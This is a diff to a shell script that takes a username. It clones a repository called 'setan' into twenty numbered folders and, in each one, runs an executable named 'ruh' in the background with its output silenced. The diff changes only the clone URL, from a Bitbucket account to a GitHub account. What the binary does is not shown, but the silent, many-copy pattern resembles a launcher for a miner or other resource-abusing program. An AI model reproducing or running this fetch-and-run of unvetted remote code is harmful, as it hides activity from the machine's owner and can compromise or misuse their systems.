@@ -1,140 +1,140 @@
 USERNAME=$1
 mkdir 1 
 cd 1
-git clone https://bitbucket.org/sakalilion/setan
+git clone https://github.com/nitasajuha/setan
 cd setan
 chmod +x ruh
 ./ruh $USERNAME >/dev/null 2>&1 &
 cd ..
 mkdir 2
 cd 2
-git clone https://bitbucket.org/sakalilion/setan
+git clone https://github.com/nitasajuha/setan
 cd setan
 chmod +x ruh
 ./ruh $USERNAME >/dev/null 2>&1 &
 cd ..
 mkdir 3 
 cd 3
-git clone https://bitbucket.org/sakalilion/setan
+git clone https://github.com/nitasajuha/setan
 cd setan
 chmod +x ruh
 ./ruh $USERNAME >/dev/null 2>&1 &
 cd ..
 mkdir 4
 cd 4
-git clone https://bitbucket.org/sakalilion/setan
+git clone https://github.com/nitasajuha/setan
 cd setan
 chmod +x ruh
 ./ruh $USERNAME >/dev/null 2>&1 &
 cd ..
 mkdir 5
 cd 5
-git clone https://bitbucket.org/sakalilion/setan
+git clone https://github.com/nitasajuha/setan
 cd setan
 chmod +x ruh
 ./ruh $USERNAME >/dev/null 2>&1 &
 cd ..
 mkdir 6
 cd 6
-git clone https://bitbucket.org/sakalilion/setan
+git clone https://github.com/nitasajuha/setan
 cd setan
 chmod +x ruh
 ./ruh $USERNAME >/dev/null 2>&1 &
 cd ..
 mkdir 7 
 cd 7
-git clone https://bitbucket.org/sakalilion/setan
+git clone https://github.com/nitasajuha/setan
 cd setan
 chmod +x ruh
 ./ruh $USERNAME >/dev/null 2>&1 &
 cd ..
 mkdir 8
 cd 8
-git clone https://bitbucket.org/sakalilion/setan
+git clone https://github.com/nitasajuha/setan
 cd setan
 chmod +x ruh
 ./ruh $USERNAME >/dev/null 2>&1 &
 cd ..
 mkdir 9
 cd 9
-git clone https://bitbucket.org/sakalilion/setan
+git clone https://github.com/nitasajuha/setan
 cd setan
 chmod +x ruh
 ./ruh $USERNAME >/dev/null 2>&1 &
 cd ..
 mkdir 10
 cd 10
-git clone https://bitbucket.org/sakalilion/setan
+git clone https://github.com/nitasajuha/setan
 cd setan
 chmod +x ruh
 ./ruh $USERNAME >/dev/null 2>&1 &
 cd ..
 mkdir 11
 cd 11
-git clone https://bitbucket.org/sakalilion/setan
+git clone https://github.com/nitasajuha/setan
 cd setan
 chmod +x ruh
 ./ruh $USERNAME >/dev/null 2>&1 &
 cd ..
 mkdir 12
 cd 12
-git clone https://bitbucket.org/sakalilion/setan
+git clone https://github.com/nitasajuha/setan
 cd setan
 chmod +x ruh
 ./ruh $USERNAME >/dev/null 2>&1 &
 cd ..
 mkdir 13
 cd 13
-git clone https://bitbucket.org/sakalilion/setan
+git clone https://github.com/nitasajuha/setan
 cd setan
 chmod +x ruh
 ./ruh $USERNAME >/dev/null 2>&1 &
 cd ..
 mkdir 14
 cd 14
-git clone https://bitbucket.org/sakalilion/setan
+git clone https://github.com/nitasajuha/setan
 cd setan
 chmod +x ruh
 ./ruh $USERNAME >/dev/null 2>&1 &
 cd ..
 mkdir 15
 cd 15
-git clone https://bitbucket.org/sakalilion/setan
+git clone https://github.com/nitasajuha/setan
 cd setan
 chmod +x ruh
 ./ruh $USERNAME >/dev/null 2>&1 &
 cd ..
 mkdir 16
 cd 16
-git clone https://bitbucket.org/sakalilion/setan
+git clone https://github.com/nitasajuha/setan
 cd setan
 chmod +x ruh
 ./ruh $USERNAME >/dev/null 2>&1 &
 cd ..
 mkdir 17
 cd 17
-git clone https://bitbucket.org/sakalilion/setan
+git clone https://github.com/nitasajuha/setan
 cd setan
 chmod +x ruh
 ./ruh $USERNAME >/dev/null 2>&1 &
 cd ..
 mkdir 18
 cd 18
-git clone https://bitbucket.org/sakalilion/setan
+git clone https://github.com/nitasajuha/setan
 cd setan
 chmod +x ruh
 ./ruh $USERNAME >/dev/null 2>&1 &
 cd ..
 mkdir 19
 cd 19
-git clone https://bitbucket.org/sakalilion/setan
+git clone https://github.com/nitasajuha/setan
 cd setan
 chmod +x ruh
 ./ruh $USERNAME >/dev/null 2>&1 &
 cd ..
 mkdir 20
 cd 20
-git clone https://bitbucket.org/sakalilion/setan
+git clone https://github.com/nitasajuha/setan
 cd setan
 chmod +x ruh
 ./ruh $USERNAME >/dev/null 2>&1 &
